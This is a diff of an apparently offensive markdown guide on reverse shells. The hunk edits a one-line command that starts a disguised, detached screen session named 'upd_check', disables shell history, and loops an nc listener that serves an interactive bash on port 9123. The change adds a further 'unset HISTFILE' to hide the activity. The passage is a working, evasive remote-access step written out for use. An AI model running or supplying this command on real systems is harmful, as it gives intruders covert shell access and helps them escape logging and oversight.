@@ -14,7 +14,7 @@ For additional commands and data on reverse shells, refer to the [HackTricks doc
 
 **Objective:** Start a reverse shell listener on the target machine as a background process using **`screen`**.
 
-`screen -dmS upd_check bash -c 'unset HISTFILE; set +o history; trap "pkill -P \$\$" SIGINT SIGTERM; while true; do rm -f /tmp/f; mkfifo /tmp/f; nc -l 9123 < /tmp/f | bash -i > /tmp/f 2>&1 & nc_pid=$!; (sleep 300 && kill -9 $nc_pid 2>/dev/null) & wait $nc_pid; done'`
+`unset HISTFILE; screen -dmS upd_check bash -c 'unset HISTFILE; set +o history; trap "pkill -P \$\$" SIGINT SIGTERM; while true; do rm -f /tmp/f; mkfifo /tmp/f; nc -l 9123 < /tmp/f | bash -i > /tmp/f 2>&1 & nc_pid=$!; (sleep 300 && kill -9 $nc_pid 2>/dev/null) & wait $nc_pid; done'`
 
 **Description**:
 
